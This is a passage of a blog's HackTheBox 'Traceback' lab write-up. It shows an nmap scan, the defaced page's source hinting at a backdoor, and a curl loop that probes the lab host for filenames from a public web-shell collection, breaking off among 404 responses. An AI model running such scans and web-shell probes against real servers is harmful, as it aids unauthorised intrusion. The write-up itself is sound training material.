<!DOCTYPE html><html lang="en" mode="dark" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>HackTheBox Traceback Writeup | cantchasee</title><meta name="generator" content="Jekyll v4.1.1" /><meta property="og:title" content="HackTheBox Traceback Writeup" /><meta name="author" content="cantchasee" /><meta property="og:locale" content="en_US" /><meta name="description" content="Hello hackerz, today Traceback machine was retired so here is my writeup :D" /><meta property="og:description" content="Hello hackerz, today Traceback machine was retired so here is my writeup :D" /><link rel="canonical" href="https://cantchasee.github.io/posts/HTB-Traceback-Writeup/" /><meta property="og:url" content="https://cantchasee.github.io/posts/HTB-Traceback-Writeup/" /><meta property="og:site_name" content="cantchasee" /><meta property="og:image" content="https://cantchasee.github.io/assets/img/traceback_logo.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-08-15T00:00:00+01:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://cantchasee.github.io/assets/img/traceback_logo.png" /><meta property="twitter:title" content="HackTheBox Traceback Writeup" /><meta name="twitter:site" content="@can_tcha" /><meta name="twitter:creator" content="@cantchasee" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"cantchasee"},"description":"Hello hackerz, today Traceback machine was retired so here is my writeup :D","url":"https://cantchasee.github.io/posts/HTB-Traceback-Writeup/","headline":"HackTheBox Traceback Writeup","dateModified":"2020-08-15T00:00:00+01:00","@type":"BlogPosting","datePublished":"2020-08-15T00:00:00+01:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://cantchasee.github.io/posts/HTB-Traceback-Writeup/"},"image":"https://cantchasee.github.io/assets/img/traceback_logo.png","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --> <script src="/assets/js/post.min.js" async></script> <script src="/app.js" defer></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">cantchasee</a></div><div class="site-subtitle font-italic">A blog with posts :P.</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/unlock/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>UNLOCK POST</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/whoami/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>WHOAMI</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/Cantchasee" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/can_tcha" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://www.hackthebox.eu/home/users/profile/148910" target="_blank"> <i class="fas fa-cube"></i> </a> <a href="/feed.xml" > <i class="fas fa-rss"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HackTheBox Traceback Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Refactor the HTML structure. --> <!-- Suroundding the markdown table with '<div class="table-wrapper">. and '</div>' --> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox Traceback Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, Aug 15, 2020, 12:00 AM +0100" > Aug 15 <i class="unloaded">2020-08-15T00:00:00+01:00</i> </span> by <span class="author"> cantchasee </span></div><div> Updated <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Oct 4, 2020, 2:38 PM +0100" > Oct 4 <i class="unloaded">2020-10-04T14:38:26+01:00</i> </span></div></div><div class="post-content"> <img src="/assets/img/traceback_logo.png" class="post-preview-img"><p>Hello hackerz, today Traceback machine was retired so here is my writeup :D</p><h2 id="recon">Recon</h2><p>First of all, let’s start with a basic nmap scan:</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="nv">$nmap</span> <span class="nt">-A</span> 10.10.10.181

Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-08-13 14:33 +01
Stats: 0:00:22 elapsed<span class="p">;</span> 0 hosts completed <span class="o">(</span>1 up<span class="o">)</span>, 1 undergoing Service Scan
Service scan Timing: About 50.00% <span class="k">done</span><span class="p">;</span> ETC: 14:33 <span class="o">(</span>0:00:06 remaining<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.10.10.181
Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 <span class="o">(</span>RSA<span class="o">)</span>
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Help us
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>25.95 seconds
</pre></table></code></div></div><p>so there is 2 open ports 22 for <strong>ssh</strong> and 80 for <strong>http</strong></p><h2 id="foothold">Foothold</h2><p>By openning our browser and going to <code class="language-plaintext highlighter-rouge">http://10.10.10.181/</code> we see:</p><p><img src="/assets/img/traceback-webpage.png" alt="" /></p><p>Let’s view it source code by pressing <code class="language-plaintext highlighter-rouge">Ctrl + U</code> we will get:</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
	<span class="nt">&lt;title&gt;</span>Help us<span class="nt">&lt;/title&gt;</span>
	<span class="nt">&lt;style </span><span class="na">type=</span><span class="s">"text/css"</span><span class="nt">&gt;</span>
		<span class="k">@-webkit-keyframes</span> <span class="n">blinking</span> <span class="p">{</span>
			<span class="err">0</span><span class="o">%</span>	 <span class="p">{</span> <span class="nl">background-color</span><span class="p">:</span> <span class="m">#fff</span><span class="p">;</span> <span class="p">}</span>
			<span class="err">49</span><span class="o">%</span> <span class="p">{</span> <span class="nl">background-color</span><span class="p">:</span> <span class="m">#fff</span><span class="p">;</span> <span class="p">}</span>
			<span class="err">50</span><span class="o">%</span> <span class="p">{</span> <span class="nl">background-color</span><span class="p">:</span> <span class="m">#000</span><span class="p">;</span> <span class="p">}</span>
			<span class="err">99</span><span class="o">%</span> <span class="p">{</span> <span class="nl">background-color</span><span class="p">:</span> <span class="m">#000</span><span class="p">;</span> <span class="p">}</span>
			<span class="err">100</span><span class="o">%</span> <span class="p">{</span> <span class="nl">background-color</span><span class="p">:</span> <span class="m">#fff</span><span class="p">;</span> <span class="p">}</span>
		<span class="p">}</span>
		<span class="k">@-moz-keyframes</span> <span class="n">blinking</span> <span class="p">{</span>
			<span class="err">0</span><span class="o">%</span>	 <span class="p">{</span> <span class="nl">background-color</span><span class="p">:</span> <span class="m">#fff</span><span class="p">;</span> <span class="p">}</span>
			<span class="err">49</span><span class="o">%</span> <span class="p">{</span> <span class="nl">background-color</span><span class="p">:</span> <span class="m">#fff</span><span class="p">;</span> <span class="p">}</span>
			<span class="err">50</span><span class="o">%</span> <span class="p">{</span> <span class="nl">background-color</span><span class="p">:</span> <span class="m">#000</span><span class="p">;</span> <span class="p">}</span>
			<span class="err">99</span><span class="o">%</span> <span class="p">{</span> <span class="nl">background-color</span><span class="p">:</span> <span class="m">#000</span><span class="p">;</span> <span class="p">}</span>
			<span class="err">100</span><span class="o">%</span> <span class="p">{</span> <span class="nl">background-color</span><span class="p">:</span> <span class="m">#fff</span><span class="p">;</span> <span class="p">}</span>
		<span class="p">}</span>
		<span class="k">@keyframes</span> <span class="n">blinking</span> <span class="p">{</span>
			<span class="err">0</span><span class="o">%</span>	 <span class="p">{</span> <span class="nl">background-color</span><span class="p">:</span> <span class="m">#fff</span><span class="p">;</span> <span class="p">}</span>
			<span class="err">49</span><span class="o">%</span> <span class="p">{</span> <span class="nl">background-color</span><span class="p">:</span> <span class="m">#fff</span><span class="p">;</span> <span class="p">}</span>
			<span class="err">50</span><span class="o">%</span> <span class="p">{</span> <span class="nl">background-color</span><span class="p">:</span> <span class="m">#000</span><span class="p">;</span> <span class="p">}</span>
			<span class="err">99</span><span class="o">%</span> <span class="p">{</span> <span class="nl">background-color</span><span class="p">:</span> <span class="m">#000</span><span class="p">;</span> <span class="p">}</span>
			<span class="err">100</span><span class="o">%</span> <span class="p">{</span> <span class="nl">background-color</span><span class="p">:</span> <span class="m">#fff</span><span class="p">;</span> <span class="p">}</span>
		<span class="p">}</span>
		<span class="nt">body</span> <span class="p">{</span>
			<span class="nl">-webkit-animation</span><span class="p">:</span> <span class="n">blinking</span> <span class="m">12.5s</span> <span class="n">infinite</span><span class="p">;</span>
			<span class="nl">-moz-animation</span><span class="p">:</span> <span class="n">blinking</span> <span class="m">12.5s</span> <span class="n">infinite</span><span class="p">;</span>
			<span class="nl">animation</span><span class="p">:</span> <span class="n">blinking</span> <span class="m">12.5s</span> <span class="n">infinite</span><span class="p">;</span>
			<span class="nl">color</span><span class="p">:</span> <span class="no">red</span><span class="p">;</span>
		<span class="p">}</span>
		
	<span class="nt">&lt;/style&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
	<span class="nt">&lt;center&gt;</span>
		<span class="nt">&lt;h1&gt;</span>This site has been owned<span class="nt">&lt;/h1&gt;</span>
		<span class="nt">&lt;h2&gt;</span>I have left a backdoor for all the net. FREE INTERNETZZZ<span class="nt">&lt;/h2&gt;</span>
		<span class="nt">&lt;h3&gt;</span> - Xh4H - <span class="nt">&lt;/h3&gt;</span>
		<span class="c">&lt;!--Some of the best web shells that you might need ;)--&gt;</span>
	<span class="nt">&lt;/center&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p>As we can see there is a little comment in the end:</p><p><code class="language-plaintext highlighter-rouge">&lt;!--Some of the best web shells that you might need ;)--&gt;</code></p><p>it seems like a hint but if you see something weird or you don’t understand <em>just google it who know what you’ll get ;)</em> so googling it gave me a github link with the name Xh4h:</p><p><img src="/assets/img/traceback-comment-google.png" alt="" /></p><p>When seeing this the first things that came in my mind was <code class="language-plaintext highlighter-rouge">What if the machine website have one of these</code> so as a lazy person to check it I just:</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
</pre><td class="rouge-code"><pre>~/HackTheBox/TraceBack ❯ git clone https://github.com/Xh4H/Web-Shells.git
Cloning into <span class="s1">'Web-Shells'</span>...
remote: Enumerating objects: 68, <span class="k">done</span><span class="nb">.</span>
remote: Total 68 <span class="o">(</span>delta 0<span class="o">)</span>, reused 0 <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused 68
Unpacking objects: 100% <span class="o">(</span>68/68<span class="o">)</span>, 1.85 MiB | 396.00 KiB/s, <span class="k">done</span><span class="nb">.</span>

~/HackTheBox/TraceBack ❯ <span class="k">for </span>i <span class="k">in</span> <span class="sb">`</span><span class="nb">ls</span><span class="sb">`</span><span class="p">;</span><span class="k">do </span>curl <span class="nt">-X</span> GET http://10.10.10.181/<span class="nv">$i</span><span class="p">;</span><span class="k">done</span>
&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//IETF//DTD HTML 2.0//EN"</span><span class="o">&gt;</span>
&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL /README.md was not found on this server.&lt;/p&gt;
&lt;hr&gt;
&lt;address&gt;Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span> Server at 10.10.10.181 Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;
&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//IETF//DTD HTML 2.0//EN"</span><span class="o">&gt;</span>
&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL /alfa3.php was not found on this server.&lt;/p&gt;
&lt;hr&gt;
&lt;address&gt;Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span> Server at 10.10.10.181 Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;
&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//IETF//DTD HTML 2.0//EN"</span><span class="o">&gt;</span>
&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL /alfav3.0.1.php was not found on this server.&lt;/p&gt;
&lt;hr&gt;
&lt;address&gt;Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span> Server at 10.10.10.181 Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;
&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//IETF//DTD HTML 2.0//EN"</span><span class="o">&gt;</span>
&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL /andela.php was not found on this server.&lt;/p&gt;
&lt;hr&gt;
&lt;address&gt;Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span> Server at 10.10.10.181 Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;
&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//IETF//DTD HTML 2.0//EN"</span><span class="o">&gt;</span>
&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL /bloodsecv4.php was not found on this server.&lt;/p&gt;
&lt;hr&gt;
&lt;address&gt;Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span> Server at 10.10.10.181 Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;
&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//IETF//DTD HTML 2.0//EN"</span><span class="o">&gt;</span>
&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL /by.php was not found on this server.&lt;/p&gt;
&lt;hr&gt;
&lt;address&gt;Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span> Server at 10.10.10.181 Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;
&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//IETF//DTD HTML 2.0//EN"</span><span class="o">&gt;</span>
&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL /c99ud.php was not found on this server.&lt;/p&gt;
&lt;hr&gt;
&lt;address&gt;Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span> Server at 10.10.10.181 Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;
&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//IETF//DTD HTML 2.0//EN"</span><span class="o">&gt;</span>
&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL /cmd.php was not found on this server.&lt;/p&gt;
&lt;hr&gt;
&lt;address&gt;Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span> Server at 10.10.10.181 Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;
&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//IETF//DTD HTML 2.0//EN"</span><span class="o">&gt;</span>
&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL /configkillerionkros.php was not found on this server.&lt;/p&gt;
&lt;hr&gt;
&lt;address&gt;Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span> Server at 10.10.10.181 Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;
&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//IETF//DTD HTML 2.0//EN"</span><span class="o">&gt;</span>
&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL /jspshell.jsp was not found on this server.&lt;/p&gt;
&lt;hr&gt;
&lt;address&gt;Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span> Server at 10.10.10.181 Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;
&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//IETF//DTD HTML 2.0//EN"</span><span class="o">&gt;</span>
&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL /mini.php was not found on this server.&lt;/p&gt;
&lt;hr&gt;
&lt;address&gt;Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span> Server at 10.10.10.181 Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;
&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//IETF//DTD HTML 2.0//EN"</span><span class="o">&gt;</span>
&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL /obfuscated-punknopass.php was not found on this server.&lt;/p&gt;
&lt;hr&gt;
&lt;address&gt;Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span> Server at 10.10.10.181 Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;
&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//IETF//DTD HTML 2.0//EN"</span><span class="o">&gt;</span>
&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL /punk-nopass.php was not found on this server.&lt;/p&gt;
&lt;hr&gt;
&lt;address&gt;Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span> Server at 10.10.10.181 Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;
&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//IETF//DTD HTML 2.0//EN"</span><span class="o">&gt;</span>
&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL /punkholic.php was not found on this server.&lt;/p&gt;
&lt;hr&gt;
&lt;address&gt;Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span> Server at 10.10.10.181 Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;
&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//IETF//DTD HTML 2.0//EN"</span><span class="o">&gt;</span>
&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL /r57.php was not found on this server.&lt;/p&gt;
&lt;hr&gt;
